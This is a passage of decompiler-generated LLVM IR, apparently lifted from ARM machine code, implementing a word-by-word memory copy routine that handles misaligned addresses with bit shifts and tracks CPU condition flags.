  store i1 %v7_2c0dc, i1* %cpsr_z.global-to-local, align 1
  br label %dec_label_pc_2c0e4

dec_label_pc_2c0e4:                               ; preds = %dec_label_pc_2c0e4.loopexit, %dec_label_pc_2c0c0
  %v0_2c00c59 = phi i32 [ %v1_2c0dc, %dec_label_pc_2c0e4.loopexit ], [ %v1_2c0c4, %dec_label_pc_2c0c0 ]
  %v0_2c0e4 = load i32, i32* %r1.global-to-local, align 4
  %v1_2c0e4 = add i32 %v0_2c0e4, -3
  store i32 %v1_2c0e4, i32* %r1.global-to-local, align 4
  br label %bb141

dec_label_pc_2c0ec:                               ; preds = %dec_label_pc_2c06c
  br i1 %v2_2c0f0, label %dec_label_pc_2c138, label %dec_label_pc_2c0f4

dec_label_pc_2c0f4:                               ; preds = %dec_label_pc_2c0ec
  store i32 %v1_2c0ec, i32* %r2.global-to-local, align 4
  %v3_2c0f8 = load i32, i32* @r4, align 4
  store i32 %v3_2c0f8, i32* %stack_var_-16, align 4
  %v6_2c0f8 = load i32, i32* @r5, align 4
  store i32 %v6_2c0f8, i32* %stack_var_-12, align 4
  br label %dec_label_pc_2c0fc

dec_label_pc_2c0fc:                               ; preds = %dec_label_pc_2c0fc.dec_label_pc_2c0fc_crit_edge, %dec_label_pc_2c0f4
  %v0_2c120 = phi i32 [ %v12_2c120, %dec_label_pc_2c0fc.dec_label_pc_2c0fc_crit_edge ], [ %v0_2c18c76, %dec_label_pc_2c0f4 ]
  %v0_2c100 = phi i32 [ %v0_2c100.pre, %dec_label_pc_2c0fc.dec_label_pc_2c0fc_crit_edge ], [ %v4_2c070, %dec_label_pc_2c0f4 ]
  %v0_2c0fc = phi i32 [ %v0_2c0fc.pre, %dec_label_pc_2c0fc.dec_label_pc_2c0fc_crit_edge ], [ %v2_2c070, %dec_label_pc_2c0f4 ]
  %v3_2c0fc = udiv i32 %v0_2c0fc, 65536
  %v1_2c100 = inttoptr i32 %v0_2c100 to i32*
  %v2_2c100 = load i32, i32* %v1_2c100, align 4
  store i32 %v2_2c100, i32* %r4.global-to-local, align 4
  %v3_2c100 = add i32 %v0_2c100, 4
  %v4_2c100 = inttoptr i32 %v3_2c100 to i32*
  %v5_2c100 = load i32, i32* %v4_2c100, align 4
  store i32 %v5_2c100, i32* %r5.global-to-local, align 4
  %v6_2c100 = add i32 %v0_2c100, 8
  %v7_2c100 = inttoptr i32 %v6_2c100 to i32*
  %v8_2c100 = load i32, i32* %v7_2c100, align 4
  store i32 %v8_2c100, i32* %ip.global-to-local, align 4
  %v9_2c100 = add i32 %v0_2c100, 12
  %v10_2c100 = inttoptr i32 %v9_2c100 to i32*
  %v11_2c100 = load i32, i32* %v10_2c100, align 4
  store i32 %v11_2c100, i32* %lr.global-to-local, align 4
  %v12_2c100 = add i32 %v0_2c100, 16
  store i32 %v12_2c100, i32* %r1.global-to-local, align 4
  %v4_2c104 = mul i32 %v2_2c100, 65536
  %v5_2c104 = or i32 %v4_2c104, %v3_2c0fc
  store i32 %v5_2c104, i32* @r3, align 4
  %v3_2c108 = udiv i32 %v2_2c100, 65536
  %v4_2c10c = mul i32 %v5_2c100, 65536
  %v5_2c10c = or i32 %v4_2c10c, %v3_2c108
  store i32 %v5_2c10c, i32* %r4.global-to-local, align 4
  %v3_2c110 = udiv i32 %v5_2c100, 65536
  %v4_2c114 = mul i32 %v8_2c100, 65536
  %v5_2c114 = or i32 %v4_2c114, %v3_2c110
  store i32 %v5_2c114, i32* %r5.global-to-local, align 4
  %v3_2c118 = udiv i32 %v8_2c100, 65536
  %v4_2c11c = mul i32 %v11_2c100, 65536
  %v5_2c11c = or i32 %v4_2c11c, %v3_2c118
  store i32 %v5_2c11c, i32* @ip, align 4
  %v1_2c120 = inttoptr i32 %v0_2c120 to i32*
  store i32 %v5_2c104, i32* %v1_2c120, align 4
  %v3_2c120 = add i32 %v0_2c120, 4
  %v4_2c120 = inttoptr i32 %v3_2c120 to i32*
  %v5_2c120 = load i32, i32* %r4.global-to-local, align 4
  store i32 %v5_2c120, i32* %v4_2c120, align 4
  %v6_2c120 = add i32 %v0_2c120, 8
  %v7_2c120 = inttoptr i32 %v6_2c120 to i32*
  %v8_2c120 = load i32, i32* %r5.global-to-local, align 4
  store i32 %v8_2c120, i32* %v7_2c120, align 4
  %v9_2c120 = add i32 %v0_2c120, 12
  %v10_2c120 = inttoptr i32 %v9_2c120 to i32*
  %v11_2c120 = load i32, i32* @ip, align 4
  store i32 %v11_2c120, i32* %v10_2c120, align 4
  %v12_2c120 = add i32 %v0_2c120, 16
  store i32 %v12_2c120, i32* %r0.global-to-local, align 4
  %v0_2c124 = load i32, i32* %r2.global-to-local, align 4
  %v1_2c124 = add i32 %v0_2c124, -16
  store i32 %v1_2c124, i32* %r2.global-to-local, align 4
  %v3_2c124 = sub i32 15, %v0_2c124
  %v4_2c124 = and i32 %v3_2c124, %v0_2c124
  %v5_2c124 = icmp slt i32 %v4_2c124, 0
  %v6_2c124 = icmp slt i32 %v1_2c124, 0
  %v2_2c128 = xor i1 %v6_2c124, %v5_2c124
  br i1 %v2_2c128, label %dec_label_pc_2c12c, label %dec_label_pc_2c0fc.dec_label_pc_2c0fc_crit_edge

dec_label_pc_2c0fc.dec_label_pc_2c0fc_crit_edge:  ; preds = %dec_label_pc_2c0fc
  %v0_2c0fc.pre = load i32, i32* %lr.global-to-local, align 4
  %v0_2c100.pre = load i32, i32* %r1.global-to-local, align 4
  br label %dec_label_pc_2c0fc

dec_label_pc_2c12c:                               ; preds = %dec_label_pc_2c0fc
  %v2_2c12c = load i32, i32* %stack_var_-16, align 4
  store i32 %v2_2c12c, i32* @r4, align 4
  %v5_2c12c = load i32, i32* %stack_var_-12, align 4
  store i32 %v5_2c12c, i32* @r5, align 4
  %v1_2c130 = add i32 %v0_2c124, -4
  store i32 %v1_2c130, i32* %r2.global-to-local, align 4
  %v3_2c130 = add i32 %v0_2c124, 2147483632
  %v4_2c130 = and i32 %v1_2c130, %v3_2c130
  %v5_2c130 = icmp slt i32 %v4_2c130, 0
  store i1 %v5_2c130, i1* %cpsr_v.global-to-local, align 1
  %v6_2c130 = icmp slt i32 %v1_2c130, 0
  store i1 %v6_2c130, i1* %cpsr_n.global-to-local, align 1
  %v7_2c130 = icmp eq i32 %v1_2c130, 0
  store i1 %v7_2c130, i1* %cpsr_z.global-to-local, align 1
  %v2_2c134 = xor i1 %v6_2c130, %v5_2c130
  br i1 %v2_2c134, label %dec_label_pc_2c150, label %dec_label_pc_2c138

dec_label_pc_2c138:                               ; preds = %dec_label_pc_2c12c, %dec_label_pc_2c0ec, %dec_label_pc_2c138
  %v1_2c144 = phi i32 [ %v4_2c144, %dec_label_pc_2c138 ], [ %v12_2c120, %dec_label_pc_2c12c ], [ %v0_2c18c76, %dec_label_pc_2c0ec ]
  %v0_2c138 = load i32, i32* %lr.global-to-local, align 4
  %v3_2c138 = udiv i32 %v0_2c138, 65536
  store i32 %v3_2c138, i32* %ip.global-to-local, align 4
  %v0_2c13c = load i32, i32* %r1.global-to-local, align 4
  %v1_2c13c = inttoptr i32 %v0_2c13c to i32*
  %v2_2c13c = load i32, i32* %v1_2c13c, align 4
  store i32 %v2_2c13c, i32* %lr.global-to-local, align 4
  %v4_2c13c = add i32 %v0_2c13c, 4
  store i32 %v4_2c13c, i32* %r1.global-to-local, align 4
  %v4_2c140 = mul i32 %v2_2c13c, 65536
  %v5_2c140 = or i32 %v4_2c140, %v3_2c138
  store i32 %v5_2c140, i32* @ip, align 4
  %v2_2c144 = inttoptr i32 %v1_2c144 to i32*
  store i32 %v5_2c140, i32* %v2_2c144, align 4
  %v3_2c144 = load i32, i32* %r0.global-to-local, align 4
  %v4_2c144 = add i32 %v3_2c144, 4
  store i32 %v4_2c144, i32* %r0.global-to-local, align 4
  %v0_2c148 = load i32, i32* %r2.global-to-local, align 4
  %v1_2c148 = add i32 %v0_2c148, -4
  store i32 %v1_2c148, i32* %r2.global-to-local, align 4
  %v3_2c148 = sub i32 3, %v0_2c148
  %v4_2c148 = and i32 %v3_2c148, %v0_2c148
  %v5_2c148 = icmp slt i32 %v4_2c148, 0
  %v6_2c148 = icmp slt i32 %v1_2c148, 0
  %v2_2c14c = xor i1 %v6_2c148, %v5_2c148
  br i1 %v2_2c14c, label %dec_label_pc_2c150.loopexit, label %dec_label_pc_2c138

dec_label_pc_2c150.loopexit:                      ; preds = %dec_label_pc_2c138
  %v7_2c148 = icmp eq i32 %v0_2c148, 4
  store i1 %v5_2c148, i1* %cpsr_v.global-to-local, align 1
  store i1 %v6_2c148, i1* %cpsr_n.global-to-local, align 1
  store i1 %v7_2c148, i1* %cpsr_z.global-to-local, align 1
  br label %dec_label_pc_2c150

dec_label_pc_2c150:                               ; preds = %dec_label_pc_2c150.loopexit, %dec_label_pc_2c12c
  %v0_2c00c60 = phi i32 [ %v1_2c148, %dec_label_pc_2c150.loopexit ], [ %v1_2c130, %dec_label_pc_2c12c ]
  %v0_2c150 = load i32, i32* %r1.global-to-local, align 4
  %v1_2c150 = add i32 %v0_2c150, -2
  store i32 %v1_2c150, i32* %r1.global-to-local, align 4
  br label %bb141

dec_label_pc_2c158:                               ; preds = %dec_label_pc_2c06c
  br i1 %v2_2c0f0, label %dec_label_pc_2c1a4, label %dec_label_pc_2c160

dec_label_pc_2c160:                               ; preds = %dec_label_pc_2c158
  store i32 %v1_2c0ec, i32* %r2.global-to-local, align 4
  %v3_2c164 = load i32, i32* @r4, align 4
  store i32 %v3_2c164, i32* %stack_var_-16, align 4
  %v6_2c164 = load i32, i32* @r5, align 4
  store i32 %v6_2c164, i32* %stack_var_-12, align 4
  br label %dec_label_pc_2c168

dec_label_pc_2c168:                               ; preds = %dec_label_pc_2c168.dec_label_pc_2c168_crit_edge, %dec_label_pc_2c160
  %v0_2c18c = phi i32 [ %v12_2c18c, %dec_label_pc_2c168.dec_label_pc_2c168_crit_edge ], [ %v0_2c18c76, %dec_label_pc_2c160 ]
  %v0_2c16c = phi i32 [ %v0_2c16c.pre, %dec_label_pc_2c168.dec_label_pc_2c168_crit_edge ], [ %v4_2c070, %dec_label_pc_2c160 ]
  %v0_2c168 = phi i32 [ %v0_2c168.pre, %dec_label_pc_2c168.dec_label_pc_2c168_crit_edge ], [ %v2_2c070, %dec_label_pc_2c160 ]
  %v3_2c168 = udiv i32 %v0_2c168, 16777216
  %v1_2c16c = inttoptr i32 %v0_2c16c to i32*
  %v2_2c16c = load i32, i32* %v1_2c16c, align 4
  store i32 %v2_2c16c, i32* %r4.global-to-local, align 4
  %v3_2c16c = add i32 %v0_2c16c, 4
  %v4_2c16c = inttoptr i32 %v3_2c16c to i32*
  %v5_2c16c = load i32, i32* %v4_2c16c, align 4
  store i32 %v5_2c16c, i32* %r5.global-to-local, align 4
  %v6_2c16c = add i32 %v0_2c16c, 8
  %v7_2c16c = inttoptr i32 %v6_2c16c to i32*
  %v8_2c16c = load i32, i32* %v7_2c16c, align 4
  store i32 %v8_2c16c, i32* %ip.global-to-local, align 4
  %v9_2c16c = add i32 %v0_2c16c, 12
  %v10_2c16c = inttoptr i32 %v9_2c16c to i32*
  %v11_2c16c = load i32, i32* %v10_2c16c, align 4
  store i32 %v11_2c16c, i32* %lr.global-to-local, align 4
  %v12_2c16c = add i32 %v0_2c16c, 16
  store i32 %v12_2c16c, i32* %r1.global-to-local, align 4
  %v4_2c170 = mul i32 %v2_2c16c, 256
  %v5_2c170 = or i32 %v4_2c170, %v3_2c168
  store i32 %v5_2c170, i32* @r3, align 4
  %v3_2c174 = udiv i32 %v2_2c16c, 16777216
  %v4_2c178 = mul i32 %v5_2c16c, 256
  %v5_2c178 = or i32 %v4_2c178, %v3_2c174
  store i32 %v5_2c178, i32* %r4.global-to-local, align 4
  %v3_2c17c = udiv i32 %v5_2c16c, 16777216
  %v4_2c180 = mul i32 %v8_2c16c, 256
  %v5_2c180 = or i32 %v4_2c180, %v3_2c17c
  store i32 %v5_2c180, i32* %r5.global-to-local, align 4
  %v3_2c184 = udiv i32 %v8_2c16c, 16777216
  %v4_2c188 = mul i32 %v11_2c16c, 256
  %v5_2c188 = or i32 %v4_2c188, %v3_2c184
  store i32 %v5_2c188, i32* @ip, align 4
  %v1_2c18c = inttoptr i32 %v0_2c18c to i32*
  store i32 %v5_2c170, i32* %v1_2c18c, align 4
  %v3_2c18c = add i32 %v0_2c18c, 4
  %v4_2c18c = inttoptr i32 %v3_2c18c to i32*
  %v5_2c18c = load i32, i32* %r4.global-to-local, align 4
  store i32 %v5_2c18c, i32* %v4_2c18c, align 4
  %v6_2c18c = add i32 %v0_2c18c, 8
  %v7_2c18c = inttoptr i32 %v6_2c18c to i32*
  %v8_2c18c = load i32, i32* %r5.global-to-local, align 4
  store i32 %v8_2c18c, i32* %v7_2c18c, align 4
  %v9_2c18c = add i32 %v0_2c18c, 12
  %v10_2c18c = inttoptr i32 %v9_2c18c to i32*
  %v11_2c18c = load i32, i32* @ip, align 4
  store i32 %v11_2c18c, i32* %v10_2c18c, align 4
  %v12_2c18c = add i32 %v0_2c18c, 16
  store i32 %v12_2c18c, i32* %r0.global-to-local, align 4
  %v0_2c190 = load i32, i32* %r2.global-to-local, align 4
  %v1_2c190 = add i32 %v0_2c190, -16
  store i32 %v1_2c190, i32* %r2.global-to-local, align 4
  %v3_2c190 = sub i32 15, %v0_2c190
  %v4_2c190 = and i32 %v3_2c190, %v0_2c190
  %v5_2c190 = icmp slt i32 %v4_2c190, 0
  %v6_2c190 = icmp slt i32 %v1_2c190, 0
  %v2_2c194 = xor i1 %v6_2c190, %v5_2c190
  br i1 %v2_2c194, label %dec_label_pc_2c198, label %dec_label_pc_2c168.dec_label_pc_2c168_crit_edge

dec_label_pc_2c168.dec_label_pc_2c168_crit_edge:  ; preds = %dec_label_pc_2c168
  %v0_2c168.pre = load i32, i32* %lr.global-to-local, align 4
  %v0_2c16c.pre = load i32, i32* %r1.global-to-local, align 4
  br label %dec_label_pc_2c168

dec_label_pc_2c198:                               ; preds = %dec_label_pc_2c168
  %v2_2c198 = load i32, i32* %stack_var_-16, align 4
  store i32 %v2_2c198, i32* @r4, align 4
  %v5_2c198 = load i32, i32* %stack_var_-12, align 4
  store i32 %v5_2c198, i32* @r5, align 4
  %v1_2c19c = add i32 %v0_2c190, -4
  store i32 %v1_2c19c, i32* %r2.global-to-local, align 4
  %v3_2c19c = add i32 %v0_2c190, 2147483632
  %v4_2c19c = and i32 %v1_2c19c, %v3_2c19c
  %v5_2c19c = icmp slt i32 %v4_2c19c, 0
  store i1 %v5_2c19c, i1* %cpsr_v.global-to-local, align 1
  %v6_2c19c = icmp slt i32 %v1_2c19c, 0
  store i1 %v6_2c19c, i1* %cpsr_n.global-to-local, align 1
  %v7_2c19c = icmp eq i32 %v1_2c19c, 0
  store i1 %v7_2c19c, i1* %cpsr_z.global-to-local, align 1
  %v2_2c1a0 = xor i1 %v6_2c19c, %v5_2c19c
  br i1 %v2_2c1a0, label %dec_label_pc_2c1bc, label %dec_label_pc_2c1a4

dec_label_pc_2c1a4:                               ; preds = %dec_label_pc_2c198, %dec_label_pc_2c158, %dec_label_pc_2c1a4
  %v1_2c1b0 = phi i32 [ %v4_2c1b0, %dec_label_pc_2c1a4 ], [ %v12_2c18c, %dec_label_pc_2c198 ], [ %v0_2c18c76, %dec_label_pc_2c158 ]
  %v0_2c1a4 = load i32, i32* %lr.global-to-local, align 4
  %v3_2c1a4 = udiv i32 %v0_2c1a4, 16777216
  store i32 %v3_2c1a4, i32* %ip.global-to-local, align 4
  %v0_2c1a8 = load i32, i32* %r1.global-to-local, align 4
  %v1_2c1a8 = inttoptr i32 %v0_2c1a8 to i32*
  %v2_2c1a8 = load i32, i32* %v1_2c1a8, align 4
  store i32 %v2_2c1a8, i32* %lr.global-to-local, align 4
  %v4_2c1a8 = add i32 %v0_2c1a8, 4
  store i32 %v4_2c1a8, i32* %r1.global-to-local, align 4
  %v4_2c1ac = mul i32 %v2_2c1a8, 256
  %v5_2c1ac = or i32 %v4_2c1ac, %v3_2c1a4
  store i32 %v5_2c1ac, i32* @ip, align 4
  %v2_2c1b0 = inttoptr i32 %v1_2c1b0 to i32*
  store i32 %v5_2c1ac, i32* %v2_2c1b0, align 4
  %v3_2c1b0 = load i32, i32* %r0.global-to-local, align 4
  %v4_2c1b0 = add i32 %v3_2c1b0, 4
  store i32 %v4_2c1b0, i32* %r0.global-to-local, align 4
  %v0_2c1b4 = load i32, i32* %r2.global-to-local, align 4
  %v1_2c1b4 = add i32 %v0_2c1b4, -4
  store i32 %v1_2c1b4, i32* %r2.global-to-local, align 4
  %v3_2c1b4 = sub i32 3, %v0_2c1b4
  %v4_2c1b4 = and i32 %v3_2c1b4, %v0_2c1b4
  %v5_2c1b4 = icmp slt i32 %v4_2c1b4, 0
  %v6_2c1b4 = icmp slt i32 %v1_2c1b4, 0
  %v2_2c1b8 = xor i1 %v6_2c1b4, %v5_2c1b4
  br i1 %v2_2c1b8, label %dec_label_pc_2c1bc.loopexit, label %dec_label_pc_2c1a4

dec_label_pc_2c1bc.loopexit:                      ; preds = %dec_label_pc_2c1a4
  %v7_2c1b4 = icmp eq i32 %v0_2c1b4, 4
  store i1 %v5_2c1b4, i1* %cpsr_v.global-to-local, align 1
  store i1 %v6_2c1b4, i1* %cpsr_n.global-to-local, align 1
  store i1 %v7_2c1b4, i1* %cpsr_z.global-to-local, align 1
  br label %dec_label_pc_2c1bc

dec_label_pc_2c1bc:                               ; preds = %dec_label_pc_2c1bc.loopexit, %dec_label_pc_2c198
  %v0_2c00c61 = phi i32 [ %v1_2c1b4, %dec_label_pc_2c1bc.loopexit ], [ %v1_2c19c, %dec_label_pc_2c198 ]
  %v0_2c1bc = load i32, i32* %r1.global-to-local, align 4
  %v1_2c1bc = add i32 %v0_2c1bc, -1
  store i32 %v1_2c1bc, i32* %r1.global-to-local, align 4
  br label %bb141

dec_label_pc_2c1c4:                               ; preds = %entry
  %v1_2c1c4 = load i32, i32* @r2, align 4
  %v2_2c1c4 = add i32 %v1_2c1c4, %v0_2bf70
  store i32 %v2_2c1c4, i32* %r1.global-to-local, align 4
  %v2_2c1c8 = add i32 %v1_2c1c4, %v1_2bf70
  store i32 %v2_2c1c8, i32* %r0.global-to-local, align 4
  %v2_2c1cc = add i32 %v1_2c1c4, -4
  store i32 %v2_2c1cc, i32* %r2.global-to-local, align 4
  %v4_2c1cc = sub i32 3, %v1_2c1c4
  %v5_2c1cc = and i32 %v4_2c1cc, %v1_2c1c4
  %v6_2c1cc = icmp slt i32 %v5_2c1cc, 0
  store i1 %v6_2c1cc, i1* %cpsr_v.global-to-local, align 1
  %v7_2c1cc = icmp slt i32 %v2_2c1cc, 0
  store i1 %v7_2c1cc, i1* %cpsr_n.global-to-local, align 1
  %v8_2c1cc = icmp eq i32 %v1_2c1c4, 4
  store i1 %v8_2c1cc, i1* %cpsr_z.global-to-local, align 1
  %v5_2c1d0 = icmp slt i32 %v1_2c1c4, 4
  br i1 %v5_2c1d0, label %bb151, label %dec_label_pc_2c1d4

dec_label_pc_2c1d4:                               ; preds = %dec_label_pc_2c1c4
  %v1_2c1d4 = urem i32 %v2_2c1c8, 4
  store i32 %v1_2c1d4, i32* @ip, align 4
  store i1 false, i1* %cpsr_n.global-to-local, align 1
  %v2_2c1d4 = icmp eq i32 %v1_2c1d4, 0
  store i1 %v2_2c1d4, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_2c1d4, label %dec_label_pc_2c1dc, label %dec_label_pc_2c27c

dec_label_pc_2c1dc:                               ; preds = %dec_label_pc_2c1d4
  %v1_2c1dc = urem i32 %v2_2c1c4, 4
  store i32 %v1_2c1dc, i32* @ip, align 4
  store i1 false, i1* %cpsr_n.global-to-local, align 1
  %v2_2c1dc = icmp eq i32 %v1_2c1dc, 0
  store i1 %v2_2c1dc, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_2c1dc, label %dec_label_pc_2c1e4, label %dec_label_pc_2c2a8

dec_label_pc_2c1e4:                               ; preds = %dec_label_pc_2c1dc, %dec_label_pc_2c2a0
  %v0_2c1fc37 = phi i32 [ %v2_2c1c8, %dec_label_pc_2c1dc ], [ %v0_2c2f020, %dec_label_pc_2c2a0 ]
  %v0_2c1f836 = phi i32 [ %v2_2c1c4, %dec_label_pc_2c1dc ], [ %v0_2c2a0, %dec_label_pc_2c2a0 ]
  %v0_2c1e4 = phi i32 [ %v2_2c1cc, %dec_label_pc_2c1dc ], [ %v2_2c298, %dec_label_pc_2c2a0 ]
  %v2_2c1e4 = add i32 %v0_2c1e4, -8
  store i32 %v2_2c1e4, i32* %r2.global-to-local, align 4
  %v4_2c1e4 = sub i32 7, %v0_2c1e4
  %v5_2c1e4 = and i32 %v4_2c1e4, %v0_2c1e4
  %v6_2c1e4 = icmp slt i32 %v5_2c1e4, 0
  store i1 %v6_2c1e4, i1* %cpsr_v.global-to-local, align 1
  %v7_2c1e4 = icmp slt i32 %v2_2c1e4, 0
  store i1 %v7_2c1e4, i1* %cpsr_n.global-to-local, align 1
  %v8_2c1e4 = icmp eq i32 %v0_2c1e4, 8
  store i1 %v8_2c1e4, i1* %cpsr_z.global-to-local, align 1
  %v5_2c1e8 = icmp slt i32 %v0_2c1e4, 8
  br i1 %v5_2c1e8, label %dec_label_pc_2c234, label %dec_label_pc_2c1ec

dec_label_pc_2c1ec:                               ; preds = %dec_label_pc_2c1e4
  %v3_2c1ec = load i32, i32* @r4, align 4
  %v5_2c1ec = inttoptr i32 %v3_2c1ec to i8*
  store i8* %v5_2c1ec, i8** %stack_var_-8, align 4
  %v8_2c1ec = load i32, i32* @lr, align 4
  %v2_2c1f0 = add i32 %v0_2c1e4, -28
  store i32 %v2_2c1f0, i32* %r2.global-to-local, align 4
  %v4_2c1f0 = sub i32 27, %v0_2c1e4
  %v5_2c1f0 = and i32 %v4_2c1f0, %v2_2c1e4
  %v6_2c1f0 = icmp slt i32 %v5_2c1f0, 0
  store i1 %v6_2c1f0, i1* %cpsr_v.global-to-local, align 1
  %v7_2c1f0 = icmp slt i32 %v2_2c1f0, 0
  store i1 %v7_2c1f0, i1* %cpsr_n.global-to-local, align 1
  %v8_2c1f0 = icmp eq i32 %v2_2c1e4, 20
  store i1 %v8_2c1f0, i1* %cpsr_z.global-to-local, align 1
  %v5_2c1f4 = icmp slt i32 %v2_2c1e4, 20
  br i1 %v5_2c1f4, label %dec_label_pc_2c210, label %dec_label_pc_2c1f8

dec_label_pc_2c1f8:                               ; preds = %dec_label_pc_2c1ec, %dec_label_pc_2c1f8.dec_label_pc_2c1f8_crit_edge
  %v0_2c1fc = phi i32 [ %v1_2c204, %dec_label_pc_2c1f8.dec_label_pc_2c1f8_crit_edge ], [ %v0_2c1fc37, %dec_label_pc_2c1ec ]
  %v0_2c1f8 = phi i32 [ %v0_2c1f8.pre, %dec_label_pc_2c1f8.dec_label_pc_2c1f8_crit_edge ], [ %v0_2c1f836, %dec_label_pc_2c1ec ]
  %v1_2c1f8 = add i32 %v0_2c1f8, -4
  %v2_2c1f8 = inttoptr i32 %v1_2c1f8 to i32*
  %v3_2c1f8 = load i32, i32* %v2_2c1f8, align 4
  %v4_2c1f8 = add i32 %v0_2c1f8, -8
  %v5_2c1f8 = inttoptr i32 %v4_2c1f8 to i32*
  %v6_2c1f8 = load i32, i32* %v5_2c1f8, align 4
  store i32 %v6_2c1f8, i32* %r4.global-to-local, align 4
  %v7_2c1f8 = add i32 %v0_2c1f8, -12
  %v8_2c1f8 = inttoptr i32 %v7_2c1f8 to i32*
  %v9_2c1f8 = load i32, i32* %v8_2c1f8, align 4
  store i32 %v9_2c1f8, i32* %ip.global-to-local, align 4
  %v10_2c1f8 = add i32 %v0_2c1f8, -16
  %v11_2c1f8 = inttoptr i32 %v10_2c1f8 to i32*
  %v12_2c1f8 = load i32, i32* %v11_2c1f8, align 4
  store i32 %v12_2c1f8, i32* %lr.global-to-local, align 4
  store i32 %v10_2c1f8, i32* %r1.global-to-local, align 4
  %v1_2c1fc = add i32 %v0_2c1fc, -16
  %v2_2c1fc = inttoptr i32 %v1_2c1fc to i32*
  store i32 %v3_2c1f8, i32* %v2_2c1fc, align 4
  %v4_2c1fc = add i32 %v0_2c1fc, -12
  %v5_2c1fc = inttoptr i32 %v4_2c1fc to i32*
  %v6_2c1fc = load i32, i32* %r4.global-to-local, align 4
  store i32 %v6_2c1fc, i32* %v5_2c1fc, align 4
  %v7_2c1fc = add i32 %v0_2c1fc, -8
  %v8_2c1fc = inttoptr i32 %v7_2c1fc to i32*
  %v9_2c1fc = load i32, i32* %ip.global-to-local, align 4
  store i32 %v9_2c1fc, i32* %v8_2c1fc, align 4
  %v10_2c1fc = add i32 %v0_2c1fc, -4
  %v11_2c1fc = inttoptr i32 %v10_2c1fc to i32*
  %v12_2c1fc = load i32, i32* %lr.global-to-local, align 4
  store i32 %v12_2c1fc, i32* %v11_2c1fc, align 4
  store i32 %v1_2c1fc, i32* %r0.global-to-local, align 4
  %v0_2c200 = load i32, i32* %r1.global-to-local, align 4
  %v1_2c200 = add i32 %v0_2c200, -4
  %v2_2c200 = inttoptr i32 %v1_2c200 to i32*
  %v3_2c200 = load i32, i32* %v2_2c200, align 4
  store i32 %v3_2c200, i32* @r3, align 4
  %v4_2c200 = add i32 %v0_2c200, -8
  %v5_2c200 = inttoptr i32 %v4_2c200 to i32*
  %v6_2c200 = load i32, i32* %v5_2c200, align 4
  store i32 %v6_2c200, i32* %r4.global-to-local, align 4
  %v7_2c200 = add i32 %v0_2c200, -12
  %v8_2c200 = inttoptr i32 %v7_2c200 to i32*
  %v9_2c200 = load i32, i32* %v8_2c200, align 4
  store i32 %v9_2c200, i32* @ip, align 4
  %v10_2c200 = add i32 %v0_2c200, -16
  %v11_2c200 = inttoptr i32 %v10_2c200 to i32*
  %v12_2c200 = load i32, i32* %v11_2c200, align 4
  store i32 %v12_2c200, i32* %lr.global-to-local, align 4
  store i32 %v10_2c200, i32* %r1.global-to-local, align 4
  %v1_2c204 = add i32 %v0_2c1fc, -32
  %v2_2c204 = inttoptr i32 %v1_2c204 to i32*
  store i32 %v3_2c200, i32* %v2_2c204, align 4
  %v4_2c204 = add i32 %v0_2c1fc, -28
  %v5_2c204 = inttoptr i32 %v4_2c204 to i32*
  %v6_2c204 = load i32, i32* %r4.global-to-local, align 4
  store i32 %v6_2c204, i32* %v5_2c204, align 4
  %v7_2c204 = add i32 %v0_2c1fc, -24
  %v8_2c204 = inttoptr i32 %v7_2c204 to i32*
  %v9_2c204 = load i32, i32* @ip, align 4
  store i32 %v9_2c204, i32* %v8_2c204, align 4
  %v10_2c204 = add i32 %v0_2c1fc, -20
  %v11_2c204 = inttoptr i32 %v10_2c204 to i32*
  %v12_2c204 = load i32, i32* %lr.global-to-local, align 4
  store i32 %v12_2c204, i32* %v11_2c204, align 4
  store i32 %v1_2c204, i32* %r0.global-to-local, align 4
  %v0_2c208 = load i32, i32* %r2.global-to-local, align 4
  %v2_2c208 = add i32 %v0_2c208, -32
  store i32 %v2_2c208, i32* %r2.global-to-local, align 4
  %v6_2c20c = icmp slt i32 %v0_2c208, 32
  br i1 %v6_2c20c, label %dec_label_pc_2c210.loopexit, label %dec_label_pc_2c1f8.dec_label_pc_2c1f8_crit_edge

dec_label_pc_2c1f8.dec_label_pc_2c1f8_crit_edge:  ; preds = %dec_label_pc_2c1f8
  %v0_2c1f8.pre = load i32, i32* %r1.global-to-local, align 4
  br label %dec_label_pc_2c1f8

dec_label_pc_2c210.loopexit:                      ; preds = %dec_label_pc_2c1f8
  %v4_2c208 = sub i32 31, %v0_2c208
  %v5_2c208 = and i32 %v4_2c208, %v0_2c208
  %v6_2c208 = icmp slt i32 %v5_2c208, 0
  %v7_2c208 = icmp slt i32 %v2_2c208, 0
  store i1 %v6_2c208, i1* %cpsr_v.global-to-local, align 1
  store i1 %v7_2c208, i1* %cpsr_n.global-to-local, align 1
  store i1 false, i1* %cpsr_z.global-to-local, align 1
  br label %dec_label_pc_2c210

dec_label_pc_2c210:                               ; preds = %dec_label_pc_2c210.loopexit, %dec_label_pc_2c1ec
  %v6_2c218 = phi i32 [ %v1_2c204, %dec_label_pc_2c210.loopexit ], [ %v0_2c1fc37, %dec_label_pc_2c1ec ]
  %v0_2c220.pr = phi i32 [ %v2_2c208, %dec_label_pc_2c210.loopexit ], [ %v2_2c1f0, %dec_label_pc_2c1ec ]
  %v4_2c210 = add i32 %v0_2c220.pr, 16
  %v6_2c210 = sub i32 0, %v0_2c220.pr
  %v7_2c210 = and i32 %v4_2c210, %v6_2c210
  %v8_2c210 = icmp slt i32 %v7_2c210, 0
  store i1 %v8_2c210, i1* %cpsr_v.global-to-local, align 1
  %v9_2c210 = icmp slt i32 %v4_2c210, 0
  store i1 %v9_2c210, i1* %cpsr_n.global-to-local, align 1
  %v10_2c210 = icmp eq i32 %v4_2c210, 0
  store i1 %v10_2c210, i1* %cpsr_z.global-to-local, align 1
  %v5_2c214 = icmp slt i32 %v0_2c220.pr, -16
  br i1 %v5_2c214, label %.thread2, label %bb148

bb148:                                            ; preds = %dec_label_pc_2c210
  %v6_2c214 = load i32, i32* %r1.global-to-local, align 4
  %v7_2c214 = add i32 %v6_2c214, -4
  %v8_2c214 = inttoptr i32 %v7_2c214 to i32*
  %v9_2c214 = load i32, i32* %v8_2c214, align 4
  store i32 %v9_2c214, i32* @r3, align 4
  %v10_2c214 = add i32 %v6_2c214, -8
  %v11_2c214 = inttoptr i32 %v10_2c214 to i32*
  %v12_2c214 = load i32, i32* %v11_2c214, align 4
  store i32 %v12_2c214, i32* %r4.global-to-local, align 4
  %v13_2c214 = add i32 %v6_2c214, -12
  %v14_2c214 = inttoptr i32 %v13_2c214 to i32*
